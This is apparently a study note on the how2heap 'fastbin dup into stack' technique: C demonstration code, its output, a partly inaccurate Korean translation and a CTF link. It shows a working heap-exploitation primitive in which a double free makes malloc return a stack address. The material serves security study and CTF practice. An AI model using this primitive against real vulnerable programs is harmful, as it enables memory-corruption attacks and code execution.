# How2Heap Study 02 Fastbin Dup Into Stack

## Tech Overview

Tricking malloc into returning a nearly-arbitrary pointer by abusing the fastbin freelist.

## Source

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");

	unsigned long long stack_var;

	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that malloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	stack_var = 0x20;

	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
```

## Output

```
This file extends on fastbin_dup.c by tricking malloc into
returning a pointer to a controlled location (in this case, the stack).
The address we want malloc() to return is 0x7fffddf70f88.
Allocating 3 buffers.
1st malloc(8): 0xdb1010
2nd malloc(8): 0xdb1030
3rd malloc(8): 0xdb1050
Freeing the first one...
If we free 0xdb1010 again, things will crash because 0xdb1010 is at the top of the free list.
So, instead, we'll free 0xdb1030.
Now, we can free 0xdb1010 again, since it's not the head of the free list.
Now the free list has [ 0xdb1010, 0xdb1030, 0xdb1010 ]. We'll now carry out our attack by modifying data at 0xdb1010.
1st malloc(8): 0xdb1010
2nd malloc(8): 0xdb1030
Now the free list has [ 0xdb1010 ].
Now, we have access to 0xdb1010 while it remains at the head of the free list.
so now we are writing a fake free size (in this case, 0x20) to the stack,
so that malloc will think there is a free chunk there and agree to
return a pointer to it.
Now, we overwrite the first 8 bytes of the data at 0xdb1010 to point right before the 0x20.
3rd malloc(8): 0xdb1010, putting the stack address on the free list
4th malloc(8): 0x7fffddf70f88
```

## 개요 번역

Tricking malloc into returning a nearly-arbitrary pointer by abusing the fastbin freelist.

`fastbin` 해제 목록(freelist)을 어뷰징하여 `malloc`이 미리 지정해둔 포인터와 비슷하게 반환하게 하는 트릭이다.


## 출력 번역

```
This file extends on fastbin_dup.c by tricking malloc into returning a pointer to a controlled location (in this case, the stack).
fastbin_dup.c 파일은 malloc의 반환값을 조정할 수 있는 트릭을 다룬다. (이 상황에서는 스택)

The address we want malloc() to return is 0x7fffddf70f88.
우리가 원하는 malloc의 반환값은 0x7fffddf70f88 이다.

Allocating 3 buffers.
3개의 버퍼를 할당한다.

1st malloc(8): 0xdb1010
2nd malloc(8): 0xdb1030
3rd malloc(8): 0xdb1050

Freeing the first one...
첫 번째 버퍼를 해제한다.

If we free 0xdb1010 again, things will crash because 0xdb1010 is at the top of the free list.
만야 0xdb1010 (첫 번째에 할당했던 메모리) 를 한 번 더 해제하면, 해제 목록의 맨 위에 0xdb1010가 있기 때문에 오류가 날 것이다.

So, instead, we'll free 0xdb1030.
그 대신에, 우리는 0xdb1030(두 번째에 할당했던 메모리) 를 해제한다.

Now, we can free 0xdb1010 again, since it's not the head of the free list.
이제, 우리는 0xdb1010 (첫 번째로 할당했던 메모리) 가 해제 목록의 맨 앞에 있지 않기에 한 번 더 해제할 수 있다.

Now the free list has [ 0xdb1010, 0xdb1030, 0xdb1010 ]. We'll now carry out our attack by modifying data at 0xdb1010.
이제 해제 목록에는 [ 0xdb1010, 0xdb1030, 0xdb1010 ] 가 들어있다.
이제 데이터가 0xdb1010로 수정되도록 공격을 수행할 것이다.

1st malloc(8): 0xdb1010
2nd malloc(8): 0xdb1030

Now the free list has [ 0xdb1010 ].
이제 해제 목록에는 [ 0xdb1010 ] 가 들어있다.

Now, we have access to 0xdb1010 while it remains at the head of the free list.
이제 0xdb1010 를 해제 목록의 맨 앞에 남아있을 때까지 접근(access)한다.

so now we are writing a fake free size (in this case, 0x20) to the stack,
그래서 우리는 스택에 가짜 해제 공간의 크기(이 상황에서는 0x20)를 저장해둔다.

so that malloc will think there is a free chunk there and agree to return a pointer to it.
그래서 malloc 는 그곳에 해제되어있던 청크가 있다고 생각하고, 이곳의 포인터를 반환할 것이다.

Now, we overwrite the first 8 bytes of the data at 0xdb1010 to point right before the 0x20.
이제, 0xdb1010 (첫 번째로 할당했던 메모리) 보다 0x20 앞의 메모리의 맨 앞 8바이트를 덮어쓴다.

3rd malloc(8): 0xdb1010, putting the stack address on the free list
이 때 스택의 주소를 해제 목록에 넣는다.

4th malloc(8): 0x7fffddf70f88
```

## Applicable CTF Challenges

[Here (9447-CTF 2015 search-engine)](https://github.com/sunghun7511/Writeup/tree/master/ctf/9447-CTF/2015/exploitation/search-engine)